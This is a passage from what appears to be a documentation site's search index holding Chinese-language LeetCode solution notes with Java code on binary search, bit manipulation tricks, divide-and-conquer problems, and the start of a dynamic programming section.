\u53EF\u4EE5\u7528\u4E8C\u5206\u67E5\u627E\u627E\u51FA\u7B2C\u4E00\u4E2A\u4F4D\u7F6E\u548C\u6700\u540E\u4E00\u4E2A\u4F4D\u7F6E\uFF0C\u4F46\u662F\u5BFB\u627E\u7684\u65B9\u6CD5\u6709\u6240\u4E0D\u540C\uFF0C\u9700\u8981\u5B9E\u73B0\u4E24\u4E2A\u4E8C\u5206\u67E5\u627E\u3002\u6211\u4EEC\u5C06\u5BFB\u627E target \u6700\u540E\u4E00\u4E2A\u4F4D\u7F6E\uFF0C\u8F6C\u6362\u6210\u5BFB\u627E target+1 \u7B2C\u4E00\u4E2A\u4F4D\u7F6E\uFF0C\u518D\u5F80\u524D\u79FB\u52A8\u4E00\u4E2A\u4F4D\u7F6E\u3002\u8FD9\u6837\u6211\u4EEC\u53EA\u9700\u8981\u5B9E\u73B0\u4E00\u4E2A\u4E8C\u5206\u67E5\u627E\u4EE3\u7801\u5373\u53EF\u3002
public int[] searchRange(int[] nums, int target) { int first = findFirst(nums, target); int last = findFirst(nums, target + 1) - 1; if (first == nums.length || nums[first] != target) { return new int[]{-1, -1}; } else { return new int[]{first, Math.max(first, last)}; }
} private int findFirst(int[] nums, int target) { int l = 0, h = nums.length; // \u6CE8\u610F h \u7684\u521D\u59CB\u503C while (l < h) { int m = l + (h - l) / 2; if (nums[m] >= target) { h = m; } else { l = m + 1; } } return l;
}
\u5728\u5BFB\u627E\u7B2C\u4E00\u4E2A\u4F4D\u7F6E\u7684\u4E8C\u5206\u67E5\u627E\u4EE3\u7801\u4E2D\uFF0C\u9700\u8981\u6CE8\u610F h \u7684\u53D6\u503C\u4E3A nums.length\uFF0C\u800C\u4E0D\u662F nums.length - 1\u3002\u5148\u770B\u4EE5\u4E0B\u793A\u4F8B\uFF1A
nums = [2,2], target = 2
\u5982\u679C h \u7684\u53D6\u503C\u4E3A nums.length - 1\uFF0C\u90A3\u4E48 last = findFirst(nums, target + 1) - 1 = 1 - 1 = 0\u3002\u8FD9\u662F\u56E0\u4E3A findLeft \u53EA\u4F1A\u8FD4\u56DE [0, nums.length - 1] \u8303\u56F4\u7684\u503C\uFF0C\u5BF9\u4E8E findFirst([2,2], 3) \uFF0C\u6211\u4EEC\u5E0C\u671B\u8FD4\u56DE 3 \u63D2\u5165 nums \u4E2D\u7684\u4F4D\u7F6E\uFF0C\u4E5F\u5C31\u662F\u6570\u7EC4\u6700\u540E\u4E00\u4E2A\u4F4D\u7F6E\u518D\u5F80\u540E\u4E00\u4E2A\u4F4D\u7F6E\uFF0C\u5373 nums.length\u3002\u6240\u4EE5\u6211\u4EEC\u9700\u8981\u5C06 h \u53D6\u503C\u4E3A nums.length\uFF0C\u4ECE\u800C\u4F7F\u5F97 findFirst\u8FD4\u56DE\u7684\u533A\u95F4\u66F4\u5927\uFF0C\u80FD\u591F\u8986\u76D6 target \u5927\u4E8E nums \u6700\u540E\u4E00\u4E2A\u5143\u7D20\u7684\u60C5\u51B5\u3002`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E4%BD%8D%E8%BF%90%E7%AE%97.html",title:"Leetcode \u9898\u89E3 - \u4F4D\u8FD0\u7B97",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u4F4D\u8FD0\u7B97",slug:"leetcode-\u9898\u89E3-\u4F4D\u8FD0\u7B97",content:`Leetcode \u9898\u89E3 - \u4F4D\u8FD0\u7B97 0. \u539F\u7406
1. \u7EDF\u8BA1\u4E24\u4E2A\u6570\u7684\u4E8C\u8FDB\u5236\u8868\u793A\u6709\u591A\u5C11\u4F4D\u4E0D\u540C
2. \u6570\u7EC4\u4E2D\u552F\u4E00\u4E00\u4E2A\u4E0D\u91CD\u590D\u7684\u5143\u7D20
3. \u627E\u51FA\u6570\u7EC4\u4E2D\u7F3A\u5931\u7684\u90A3\u4E2A\u6570
4. \u6570\u7EC4\u4E2D\u4E0D\u91CD\u590D\u7684\u4E24\u4E2A\u5143\u7D20
5. \u7FFB\u8F6C\u4E00\u4E2A\u6570\u7684\u6BD4\u7279\u4F4D
6. \u4E0D\u7528\u989D\u5916\u53D8\u91CF\u4EA4\u6362\u4E24\u4E2A\u6574\u6570
7. \u5224\u65AD\u4E00\u4E2A\u6570\u662F\u4E0D\u662F 2 \u7684 n \u6B21\u65B9
8. \u5224\u65AD\u4E00\u4E2A\u6570\u662F\u4E0D\u662F 4 \u7684 n \u6B21\u65B9
9. \u5224\u65AD\u4E00\u4E2A\u6570\u7684\u4F4D\u7EA7\u8868\u793A\u662F\u5426\u4E0D\u4F1A\u51FA\u73B0\u8FDE\u7EED\u7684 0 \u548C 1
10. \u6C42\u4E00\u4E2A\u6570\u7684\u8865\u7801
11. \u5B9E\u73B0\u6574\u6570\u7684\u52A0\u6CD5
12. \u5B57\u7B26\u4E32\u6570\u7EC4\u6700\u5927\u4E58\u79EF
13. \u7EDF\u8BA1\u4ECE 0 ~ n \u6BCF\u4E2A\u6570\u7684\u4E8C\u8FDB\u5236\u8868\u793A\u4E2D 1 \u7684\u4E2A\u6570`},{header:"0. \u539F\u7406",slug:"_0-\u539F\u7406",content:`\u57FA\u672C\u539F\u7406
0s \u8868\u793A\u4E00\u4E32 0\uFF0C1s \u8868\u793A\u4E00\u4E32 1\u3002
x ^ 0s = x x & 0s = 0 x | 0s = x
x ^ 1s = ~x x & 1s = x x | 1s = 1s
x ^ x = 0 x & x = x x | x = x
\u5229\u7528 x ^ 1s = ~x \u7684\u7279\u70B9\uFF0C\u53EF\u4EE5\u5C06\u4E00\u4E2A\u6570\u7684\u4F4D\u7EA7\u8868\u793A\u7FFB\u8F6C\uFF1B\u5229\u7528 x ^ x = 0 \u7684\u7279\u70B9\uFF0C\u53EF\u4EE5\u5C06\u4E09\u4E2A\u6570\u4E2D\u91CD\u590D\u7684\u4E24\u4E2A\u6570\u53BB\u9664\uFF0C\u53EA\u7559\u4E0B\u53E6\u4E00\u4E2A\u6570\u3002
1^1^2 = 2
\u5229\u7528 x & 0s = 0 \u548C x & 1s = x \u7684\u7279\u70B9\uFF0C\u53EF\u4EE5\u5B9E\u73B0\u63A9\u7801\u64CD\u4F5C\u3002\u4E00\u4E2A\u6570 num \u4E0E mask\uFF1A00111100 \u8FDB\u884C\u4F4D\u4E0E\u64CD\u4F5C\uFF0C\u53EA\u4FDD\u7559 num \u4E2D\u4E0E mask \u7684 1 \u90E8\u5206\u76F8\u5BF9\u5E94\u7684\u4F4D\u3002
01011011 &
00111100
--------
00011000
\u5229\u7528 x | 0s = x \u548C x | 1s = 1s \u7684\u7279\u70B9\uFF0C\u53EF\u4EE5\u5B9E\u73B0\u8BBE\u503C\u64CD\u4F5C\u3002\u4E00\u4E2A\u6570 num \u4E0E mask\uFF1A00111100 \u8FDB\u884C\u4F4D\u6216\u64CD\u4F5C\uFF0C\u5C06 num \u4E2D\u4E0E mask \u7684 1 \u90E8\u5206\u76F8\u5BF9\u5E94\u7684\u4F4D\u90FD\u8BBE\u7F6E\u4E3A 1\u3002
01011011 |
00111100
--------
01111111
\u4F4D\u4E0E\u8FD0\u7B97\u6280\u5DE7
n&(n-1) \u53BB\u9664 n \u7684\u4F4D\u7EA7\u8868\u793A\u4E2D\u6700\u4F4E\u7684\u90A3\u4E00\u4F4D 1\u3002\u4F8B\u5982\u5BF9\u4E8E\u4E8C\u8FDB\u5236\u8868\u793A 01011011\uFF0C\u51CF\u53BB 1 \u5F97\u5230 01011010\uFF0C\u8FD9\u4E24\u4E2A\u6570\u76F8\u4E0E\u5F97\u5230 01011010\u3002
01011011 &
01011010
--------
01011010
n&(-n) \u5F97\u5230 n \u7684\u4F4D\u7EA7\u8868\u793A\u4E2D\u6700\u4F4E\u7684\u90A3\u4E00\u4F4D 1\u3002-n \u5F97\u5230 n \u7684\u53CD\u7801\u52A0 1\uFF0C\u4E5F\u5C31\u662F -n=~n+1\u3002\u4F8B\u5982\u5BF9\u4E8E\u4E8C\u8FDB\u5236\u8868\u793A 10110100\uFF0C-n \u5F97\u5230 01001100\uFF0C\u76F8\u4E0E\u5F97\u5230 00000100\u3002
10110100 &
01001100
--------
00000100
n-(n&(-n)) \u5219\u53EF\u4EE5\u53BB\u9664 n \u7684\u4F4D\u7EA7\u8868\u793A\u4E2D\u6700\u4F4E\u7684\u90A3\u4E00\u4F4D 1\uFF0C\u548C n&(n-1) \u6548\u679C\u4E00\u6837\u3002
\u79FB\u4F4D\u8FD0\u7B97
\\>\\> n \u4E3A\u7B97\u672F\u53F3\u79FB\uFF0C\u76F8\u5F53\u4E8E\u9664\u4EE5 2n\uFF0C\u4F8B\u5982 -7 \\>\\> 2 = -2\u3002
11111111111111111111111111111001 >> 2
--------
11111111111111111111111111111110
\\>\\>\\> n \u4E3A\u65E0\u7B26\u53F7\u53F3\u79FB\uFF0C\u5DE6\u8FB9\u4F1A\u8865\u4E0A 0\u3002\u4F8B\u5982 -7 \\>\\>\\> 2 = 1073741822\u3002
11111111111111111111111111111001 >>> 2
--------
00111111111111111111111111111111
<< n \u4E3A\u7B97\u672F\u5DE6\u79FB\uFF0C\u76F8\u5F53\u4E8E\u4E58\u4EE5 2n\u3002-7 << 2 = -28\u3002
11111111111111111111111111111001 << 2
--------
11111111111111111111111111100100
mask \u8BA1\u7B97
\u8981\u83B7\u53D6 111111111\uFF0C\u5C06 0 \u53D6\u53CD\u5373\u53EF\uFF0C~0\u3002
\u8981\u5F97\u5230\u53EA\u6709\u7B2C i \u4F4D\u4E3A 1 \u7684 mask\uFF0C\u5C06 1 \u5411\u5DE6\u79FB\u52A8 i-1 \u4F4D\u5373\u53EF\uFF0C1<<(i-1) \u3002\u4F8B\u5982 1<<4 \u5F97\u5230\u53EA\u6709\u7B2C 5 \u4F4D\u4E3A 1 \u7684 mask \uFF1A00010000\u3002
\u8981\u5F97\u5230 1 \u5230 i \u4F4D\u4E3A 1 \u7684 mask\uFF0C(1<<i)-1 \u5373\u53EF\uFF0C\u4F8B\u5982\u5C06 (1<<4)-1 = 00010000-1 = 00001111\u3002
\u8981\u5F97\u5230 1 \u5230 i \u4F4D\u4E3A 0 \u7684 mask\uFF0C\u53EA\u9700\u5C06 1 \u5230 i \u4F4D\u4E3A 1 \u7684 mask \u53D6\u53CD\uFF0C\u5373 ~((1<<i)-1)\u3002
Java \u4E2D\u7684\u4F4D\u64CD\u4F5C
static int Integer.bitCount(); // \u7EDF\u8BA1 1 \u7684\u6570\u91CF
static int Integer.highestOneBit(); // \u83B7\u5F97\u6700\u9AD8\u4F4D
static String toBinaryString(int i); // \u8F6C\u6362\u4E3A\u4E8C\u8FDB\u5236\u8868\u793A\u7684\u5B57\u7B26\u4E32`},{header:"1. \u7EDF\u8BA1\u4E24\u4E2A\u6570\u7684\u4E8C\u8FDB\u5236\u8868\u793A\u6709\u591A\u5C11\u4F4D\u4E0D\u540C",slug:"_1-\u7EDF\u8BA1\u4E24\u4E2A\u6570\u7684\u4E8C\u8FDB\u5236\u8868\u793A\u6709\u591A\u5C11\u4F4D\u4E0D\u540C",content:`Hamming Distance (Easy) Leetcode / \u529B\u6263
Input: x = 1, y = 4 Output: 2 Explanation:
1 (0 0 0 1)
4 (0 1 0 0) \u2191 \u2191 The above arrows point to positions where the corresponding bits are different.
\u5BF9\u4E24\u4E2A\u6570\u8FDB\u884C\u5F02\u6216\u64CD\u4F5C\uFF0C\u4F4D\u7EA7\u8868\u793A\u4E0D\u540C\u7684\u90A3\u4E00\u4F4D\u4E3A 1\uFF0C\u7EDF\u8BA1\u6709\u591A\u5C11\u4E2A 1 \u5373\u53EF\u3002
public int hammingDistance(int x, int y) { int z = x ^ y; int cnt = 0; while(z != 0) { if ((z & 1) == 1) cnt++; z = z >> 1; } return cnt;
}
\u4F7F\u7528 z&(z-1) \u53BB\u9664 z \u4F4D\u7EA7\u8868\u793A\u6700\u4F4E\u7684\u90A3\u4E00\u4F4D\u3002
public int hammingDistance(int x, int y) { int z = x ^ y; int cnt = 0; while (z != 0) { z &= (z - 1); cnt++; } return cnt;
}
\u53EF\u4EE5\u4F7F\u7528 Integer.bitcount() \u6765\u7EDF\u8BA1 1 \u4E2A\u7684\u4E2A\u6570\u3002
public int hammingDistance(int x, int y) { return Integer.bitCount(x ^ y);
}`},{header:"2. \u6570\u7EC4\u4E2D\u552F\u4E00\u4E00\u4E2A\u4E0D\u91CD\u590D\u7684\u5143\u7D20",slug:"_2-\u6570\u7EC4\u4E2D\u552F\u4E00\u4E00\u4E2A\u4E0D\u91CD\u590D\u7684\u5143\u7D20",content:`136. Single Number (Easy)
Leetcode / \u529B\u6263
Input: [4,1,2,1,2]
Output: 4
\u4E24\u4E2A\u76F8\u540C\u7684\u6570\u5F02\u6216\u7684\u7ED3\u679C\u4E3A 0\uFF0C\u5BF9\u6240\u6709\u6570\u8FDB\u884C\u5F02\u6216\u64CD\u4F5C\uFF0C\u6700\u540E\u7684\u7ED3\u679C\u5C31\u662F\u5355\u72EC\u51FA\u73B0\u7684\u90A3\u4E2A\u6570\u3002
public int singleNumber(int[] nums) { int ret = 0; for (int n : nums) ret = ret ^ n; return ret;
}`},{header:"3. \u627E\u51FA\u6570\u7EC4\u4E2D\u7F3A\u5931\u7684\u90A3\u4E2A\u6570",slug:"_3-\u627E\u51FA\u6570\u7EC4\u4E2D\u7F3A\u5931\u7684\u90A3\u4E2A\u6570",content:`268. Missing Number (Easy)
Leetcode / \u529B\u6263
Input: [3,0,1]
Output: 2
\u9898\u76EE\u63CF\u8FF0\uFF1A\u6570\u7EC4\u5143\u7D20\u5728 0-n \u4E4B\u95F4\uFF0C\u4F46\u662F\u6709\u4E00\u4E2A\u6570\u662F\u7F3A\u5931\u7684\uFF0C\u8981\u6C42\u627E\u5230\u8FD9\u4E2A\u7F3A\u5931\u7684\u6570\u3002
public int missingNumber(int[] nums) { int ret = 0; for (int i = 0; i < nums.length; i++) { ret = ret ^ i ^ nums[i]; } return ret ^ nums.length;
}`},{header:"4. \u6570\u7EC4\u4E2D\u4E0D\u91CD\u590D\u7684\u4E24\u4E2A\u5143\u7D20",slug:"_4-\u6570\u7EC4\u4E2D\u4E0D\u91CD\u590D\u7684\u4E24\u4E2A\u5143\u7D20",content:`260. Single Number III (Medium)
Leetcode / \u529B\u6263
\u4E24\u4E2A\u4E0D\u76F8\u7B49\u7684\u5143\u7D20\u5728\u4F4D\u7EA7\u8868\u793A\u4E0A\u5FC5\u5B9A\u4F1A\u6709\u4E00\u4F4D\u5B58\u5728\u4E0D\u540C\u3002
\u5C06\u6570\u7EC4\u7684\u6240\u6709\u5143\u7D20\u5F02\u6216\u5F97\u5230\u7684\u7ED3\u679C\u4E3A\u4E0D\u5B58\u5728\u91CD\u590D\u7684\u4E24\u4E2A\u5143\u7D20\u5F02\u6216\u7684\u7ED3\u679C\u3002
diff &= -diff \u5F97\u5230\u51FA diff \u6700\u53F3\u4FA7\u4E0D\u4E3A 0 \u7684\u4F4D\uFF0C\u4E5F\u5C31\u662F\u4E0D\u5B58\u5728\u91CD\u590D\u7684\u4E24\u4E2A\u5143\u7D20\u5728\u4F4D\u7EA7\u8868\u793A\u4E0A\u6700\u53F3\u4FA7\u4E0D\u540C\u7684\u90A3\u4E00\u4F4D\uFF0C\u5229\u7528\u8FD9\u4E00\u4F4D\u5C31\u53EF\u4EE5\u5C06\u4E24\u4E2A\u5143\u7D20\u533A\u5206\u5F00\u6765\u3002
public int[] singleNumber(int[] nums) { int diff = 0; for (int num : nums) diff ^= num; diff &= -diff; // \u5F97\u5230\u6700\u53F3\u4E00\u4F4D int[] ret = new int[2]; for (int num : nums) { if ((num & diff) == 0) ret[0] ^= num; else ret[1] ^= num; } return ret;
}`},{header:"5. \u7FFB\u8F6C\u4E00\u4E2A\u6570\u7684\u6BD4\u7279\u4F4D",slug:"_5-\u7FFB\u8F6C\u4E00\u4E2A\u6570\u7684\u6BD4\u7279\u4F4D",content:`190. Reverse Bits (Easy)
Leetcode / \u529B\u6263
public int reverseBits(int n) { int ret = 0; for (int i = 0; i < 32; i++) { ret <<= 1; ret |= (n & 1); n >>>= 1; } return ret;
}
\u5982\u679C\u8BE5\u51FD\u6570\u9700\u8981\u88AB\u8C03\u7528\u5F88\u591A\u6B21\uFF0C\u53EF\u4EE5\u5C06 int \u62C6\u6210 4 \u4E2A byte\uFF0C\u7136\u540E\u7F13\u5B58 byte \u5BF9\u5E94\u7684\u6BD4\u7279\u4F4D\u7FFB\u8F6C\uFF0C\u6700\u540E\u518D\u62FC\u63A5\u8D77\u6765\u3002
private static Map<Byte, Integer> cache = new HashMap<>(); public int reverseBits(int n) { int ret = 0; for (int i = 0; i < 4; i++) { ret <<= 8; ret |= reverseByte((byte) (n & 0b11111111)); n >>= 8; } return ret;
} private int reverseByte(byte b) { if (cache.containsKey(b)) return cache.get(b); int ret = 0; byte t = b; for (int i = 0; i < 8; i++) { ret <<= 1; ret |= t & 1; t >>= 1; } cache.put(b, ret); return ret;
}`},{header:"6. \u4E0D\u7528\u989D\u5916\u53D8\u91CF\u4EA4\u6362\u4E24\u4E2A\u6574\u6570",slug:"_6-\u4E0D\u7528\u989D\u5916\u53D8\u91CF\u4EA4\u6362\u4E24\u4E2A\u6574\u6570",content:`\u7A0B\u5E8F\u5458\u4EE3\u7801\u9762\u8BD5\u6307\u5357 \uFF1AP317
a = a ^ b;
b = a ^ b;
a = a ^ b;`},{header:"7. \u5224\u65AD\u4E00\u4E2A\u6570\u662F\u4E0D\u662F 2 \u7684 n \u6B21\u65B9",slug:"_7-\u5224\u65AD\u4E00\u4E2A\u6570\u662F\u4E0D\u662F-2-\u7684-n-\u6B21\u65B9",content:`231. Power of Two (Easy)
Leetcode / \u529B\u6263
\u4E8C\u8FDB\u5236\u8868\u793A\u53EA\u6709\u4E00\u4E2A 1 \u5B58\u5728\u3002
public boolean isPowerOfTwo(int n) { return n > 0 && Integer.bitCount(n) == 1;
}
\u5229\u7528 1000 & 0111 == 0 \u8FD9\u79CD\u6027\u8D28\uFF0C\u5F97\u5230\u4EE5\u4E0B\u89E3\u6CD5\uFF1A
public boolean isPowerOfTwo(int n) { return n > 0 && (n & (n - 1)) == 0;
}`},{header:"8. \u5224\u65AD\u4E00\u4E2A\u6570\u662F\u4E0D\u662F 4 \u7684 n \u6B21\u65B9",slug:"_8-\u5224\u65AD\u4E00\u4E2A\u6570\u662F\u4E0D\u662F-4-\u7684-n-\u6B21\u65B9",content:`342. Power of Four (Easy)
Leetcode / \u529B\u6263
\u8FD9\u79CD\u6570\u5728\u4E8C\u8FDB\u5236\u8868\u793A\u4E2D\u6709\u4E14\u53EA\u6709\u4E00\u4E2A\u5947\u6570\u4F4D\u4E3A 1\uFF0C\u4F8B\u5982 16\uFF0810000\uFF09\u3002
public boolean isPowerOfFour(int num) { return num > 0 && (num & (num - 1)) == 0 && (num & 0b01010101010101010101010101010101) != 0;
}
\u4E5F\u53EF\u4EE5\u4F7F\u7528\u6B63\u5219\u8868\u8FBE\u5F0F\u8FDB\u884C\u5339\u914D\u3002
public boolean isPowerOfFour(int num) { return Integer.toString(num, 4).matches("10*");
}`},{header:"9. \u5224\u65AD\u4E00\u4E2A\u6570\u7684\u4F4D\u7EA7\u8868\u793A\u662F\u5426\u4E0D\u4F1A\u51FA\u73B0\u8FDE\u7EED\u7684 0 \u548C 1",slug:"_9-\u5224\u65AD\u4E00\u4E2A\u6570\u7684\u4F4D\u7EA7\u8868\u793A\u662F\u5426\u4E0D\u4F1A\u51FA\u73B0\u8FDE\u7EED\u7684-0-\u548C-1",content:`693. Binary Number with Alternating Bits (Easy)
Leetcode / \u529B\u6263
Input: 10
Output: True
Explanation:
The binary representation of 10 is: 1010. Input: 11
Output: False
Explanation:
The binary representation of 11 is: 1011.
\u5BF9\u4E8E 1010 \u8FD9\u79CD\u4F4D\u7EA7\u8868\u793A\u7684\u6570\uFF0C\u628A\u5B83\u5411\u53F3\u79FB\u52A8 1 \u4F4D\u5F97\u5230 101\uFF0C\u8FD9\u4E24\u4E2A\u6570\u6BCF\u4E2A\u4F4D\u90FD\u4E0D\u540C\uFF0C\u56E0\u6B64\u5F02\u6216\u5F97\u5230\u7684\u7ED3\u679C\u4E3A 1111\u3002
public boolean hasAlternatingBits(int n) { int a = (n ^ (n >> 1)); return (a & (a + 1)) == 0;
}`},{header:"10. \u6C42\u4E00\u4E2A\u6570\u7684\u8865\u7801",slug:"_10-\u6C42\u4E00\u4E2A\u6570\u7684\u8865\u7801",content:`476. Number Complement (Easy)
Leetcode / \u529B\u6263
Input: 5
Output: 2
Explanation: The binary representation of 5 is 101 (no leading zero bits), and its complement is 010. So you need to output 2.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u4E0D\u8003\u8651\u4E8C\u8FDB\u5236\u8868\u793A\u4E2D\u7684\u9996 0 \u90E8\u5206\u3002
\u5BF9\u4E8E 00000101\uFF0C\u8981\u6C42\u8865\u7801\u53EF\u4EE5\u5C06\u5B83\u4E0E 00000111 \u8FDB\u884C\u5F02\u6216\u64CD\u4F5C\u3002\u90A3\u4E48\u95EE\u9898\u5C31\u8F6C\u6362\u4E3A\u6C42\u63A9\u7801 00000111\u3002
public int findComplement(int num) { if (num == 0) return 1; int mask = 1 << 30; while ((num & mask) == 0) mask >>= 1; mask = (mask << 1) - 1; return num ^ mask;
}
\u53EF\u4EE5\u5229\u7528 Java \u7684 Integer.highestOneBit() \u65B9\u6CD5\u6765\u83B7\u5F97\u542B\u6709\u9996 1 \u7684\u6570\u3002
public int findComplement(int num) { if (num == 0) return 1; int mask = Integer.highestOneBit(num); mask = (mask << 1) - 1; return num ^ mask;
}
\u5BF9\u4E8E 10000000 \u8FD9\u6837\u7684\u6570\u8981\u6269\u5C55\u6210 11111111\uFF0C\u53EF\u4EE5\u5229\u7528\u4EE5\u4E0B\u65B9\u6CD5\uFF1A
mask |= mask >> 1 11000000
mask |= mask >> 2 11110000
mask |= mask >> 4 11111111
public int findComplement(int num) { int mask = num; mask |= mask >> 1; mask |= mask >> 2; mask |= mask >> 4; mask |= mask >> 8; mask |= mask >> 16; return (mask ^ num);
}`},{header:"11. \u5B9E\u73B0\u6574\u6570\u7684\u52A0\u6CD5",slug:"_11-\u5B9E\u73B0\u6574\u6570\u7684\u52A0\u6CD5",content:`371. Sum of Two Integers (Easy)
Leetcode / \u529B\u6263
a ^ b \u8868\u793A\u6CA1\u6709\u8003\u8651\u8FDB\u4F4D\u7684\u60C5\u51B5\u4E0B\u4E24\u6570\u7684\u548C\uFF0C(a & b) << 1 \u5C31\u662F\u8FDB\u4F4D\u3002
\u9012\u5F52\u4F1A\u7EC8\u6B62\u7684\u539F\u56E0\u662F (a & b) << 1 \u6700\u53F3\u8FB9\u4F1A\u591A\u4E00\u4E2A 0\uFF0C\u90A3\u4E48\u7EE7\u7EED\u9012\u5F52\uFF0C\u8FDB\u4F4D\u6700\u53F3\u8FB9\u7684 0 \u4F1A\u6162\u6162\u589E\u591A\uFF0C\u6700\u540E\u8FDB\u4F4D\u4F1A\u53D8\u4E3A 0\uFF0C\u9012\u5F52\u7EC8\u6B62\u3002
public int getSum(int a, int b) { return b == 0 ? a : getSum((a ^ b), (a & b) << 1);
}`},{header:"12. \u5B57\u7B26\u4E32\u6570\u7EC4\u6700\u5927\u4E58\u79EF",slug:"_12-\u5B57\u7B26\u4E32\u6570\u7EC4\u6700\u5927\u4E58\u79EF",content:`318. Maximum Product of Word Lengths (Medium)
Leetcode / \u529B\u6263
Given ["abcw", "baz", "foo", "bar", "xtfn", "abcdef"]
Return 16
The two words can be "abcw", "xtfn".
\u9898\u76EE\u63CF\u8FF0\uFF1A\u5B57\u7B26\u4E32\u6570\u7EC4\u7684\u5B57\u7B26\u4E32\u53EA\u542B\u6709\u5C0F\u5199\u5B57\u7B26\u3002\u6C42\u89E3\u5B57\u7B26\u4E32\u6570\u7EC4\u4E2D\u4E24\u4E2A\u5B57\u7B26\u4E32\u957F\u5EA6\u7684\u6700\u5927\u4E58\u79EF\uFF0C\u8981\u6C42\u8FD9\u4E24\u4E2A\u5B57\u7B26\u4E32\u4E0D\u80FD\u542B\u6709\u76F8\u540C\u5B57\u7B26\u3002
\u672C\u9898\u4E3B\u8981\u95EE\u9898\u662F\u5224\u65AD\u4E24\u4E2A\u5B57\u7B26\u4E32\u662F\u5426\u542B\u76F8\u540C\u5B57\u7B26\uFF0C\u7531\u4E8E\u5B57\u7B26\u4E32\u53EA\u542B\u6709\u5C0F\u5199\u5B57\u7B26\uFF0C\u603B\u5171 26 \u4F4D\uFF0C\u56E0\u6B64\u53EF\u4EE5\u7528\u4E00\u4E2A 32 \u4F4D\u7684\u6574\u6570\u6765\u5B58\u50A8\u6BCF\u4E2A\u5B57\u7B26\u662F\u5426\u51FA\u73B0\u8FC7\u3002
public int maxProduct(String[] words) { int n = words.length; int[] val = new int[n]; for (int i = 0; i < n; i++) { for (char c : words[i].toCharArray()) { val[i] |= 1 << (c - 'a'); } } int ret = 0; for (int i = 0; i < n; i++) { for (int j = i + 1; j < n; j++) { if ((val[i] & val[j]) == 0) { ret = Math.max(ret, words[i].length() * words[j].length()); } } } return ret;
}`},{header:"13. \u7EDF\u8BA1\u4ECE 0 ~ n \u6BCF\u4E2A\u6570\u7684\u4E8C\u8FDB\u5236\u8868\u793A\u4E2D 1 \u7684\u4E2A\u6570",slug:"_13-\u7EDF\u8BA1\u4ECE-0-n-\u6BCF\u4E2A\u6570\u7684\u4E8C\u8FDB\u5236\u8868\u793A\u4E2D-1-\u7684\u4E2A\u6570",content:`338. Counting Bits (Medium)
Leetcode / \u529B\u6263
\u5BF9\u4E8E\u6570\u5B57 6(110)\uFF0C\u5B83\u53EF\u4EE5\u770B\u6210\u662F 4(100) \u518D\u52A0\u4E00\u4E2A 2(10)\uFF0C\u56E0\u6B64 dp[i] = dp[i&(i-1)] + 1;
public int[] countBits(int num) { int[] ret = new int[num + 1]; for(int i = 1; i <= num; i++){ ret[i] = ret[i&(i-1)] + 1; } return ret;
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%88%86%E6%B2%BB.html",title:"Leetcode \u9898\u89E3 - \u5206\u6CBB",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u5206\u6CBB",slug:"leetcode-\u9898\u89E3-\u5206\u6CBB",content:`Leetcode \u9898\u89E3 - \u5206\u6CBB 1. \u7ED9\u8868\u8FBE\u5F0F\u52A0\u62EC\u53F7
2. \u4E0D\u540C\u7684\u4E8C\u53C9\u641C\u7D22\u6811`},{header:"1. \u7ED9\u8868\u8FBE\u5F0F\u52A0\u62EC\u53F7",slug:"_1-\u7ED9\u8868\u8FBE\u5F0F\u52A0\u62EC\u53F7",content:`241. Different Ways to Add Parentheses (Medium)
Leetcode / \u529B\u6263
Input: "2-1-1". ((2-1)-1) = 0
(2-(1-1)) = 2 Output : [0, 2]
public List<Integer> diffWaysToCompute(String input) { List<Integer> ways = new ArrayList<>(); for (int i = 0; i < input.length(); i++) { char c = input.charAt(i); if (c == '+' || c == '-' || c == '*') { List<Integer> left = diffWaysToCompute(input.substring(0, i)); List<Integer> right = diffWaysToCompute(input.substring(i + 1)); for (int l : left) { for (int r : right) { switch (c) { case '+': ways.add(l + r); break; case '-': ways.add(l - r); break; case '*': ways.add(l * r); break; } } } } } if (ways.size() == 0) { ways.add(Integer.valueOf(input)); } return ways;
}`},{header:"2. \u4E0D\u540C\u7684\u4E8C\u53C9\u641C\u7D22\u6811",slug:"_2-\u4E0D\u540C\u7684\u4E8C\u53C9\u641C\u7D22\u6811",content:`95. Unique Binary Search Trees II (Medium)
Leetcode / \u529B\u6263
\u7ED9\u5B9A\u4E00\u4E2A\u6570\u5B57 n\uFF0C\u8981\u6C42\u751F\u6210\u6240\u6709\u503C\u4E3A 1...n \u7684\u4E8C\u53C9\u641C\u7D22\u6811\u3002
Input: 3
Output:
[ [1,null,3,2], [3,2,null,1], [3,1,null,null,2], [2,1,3], [1,null,2,null,3]
]
Explanation:
The above output corresponds to the 5 unique BST's shown below: 1 3 3 2 1 \\ / / / \\ \\ 3 2 1 1 3 2 / / \\ \\ 2 1 2 3
public List<TreeNode> generateTrees(int n) { if (n < 1) { return new LinkedList<TreeNode>(); } return generateSubtrees(1, n);
} private List<TreeNode> generateSubtrees(int s, int e) { List<TreeNode> res = new LinkedList<TreeNode>(); if (s > e) { res.add(null); return res; } for (int i = s; i <= e; ++i) { List<TreeNode> leftSubtrees = generateSubtrees(s, i - 1); List<TreeNode> rightSubtrees = generateSubtrees(i + 1, e); for (TreeNode left : leftSubtrees) { for (TreeNode right : rightSubtrees) { TreeNode root = new TreeNode(i); root.left = left; root.right = right; res.add(root); } } } return res;
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.html",title:"Leetcode \u9898\u89E3 - \u52A8\u6001\u89C4\u5212",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u52A8\u6001\u89C4\u5212",slug:"leetcode-\u9898\u89E3-\u52A8\u6001\u89C4\u5212",content:`Leetcode \u9898\u89E3 - \u52A8\u6001\u89C4\u5212 \u6590\u6CE2\u90A3\u5951\u6570\u5217 1. \u722C\u697C\u68AF
2. \u5F3A\u76D7\u62A2\u52AB
3. \u5F3A\u76D7\u5728\u73AF\u5F62\u8857\u533A\u62A2\u52AB
4. \u4FE1\u4EF6\u9519\u6392
5. \u6BCD\u725B\u751F\u4EA7 \u77E9\u9635\u8DEF\u5F84 1. \u77E9\u9635\u7684\u6700\u5C0F\u8DEF\u5F84\u548C
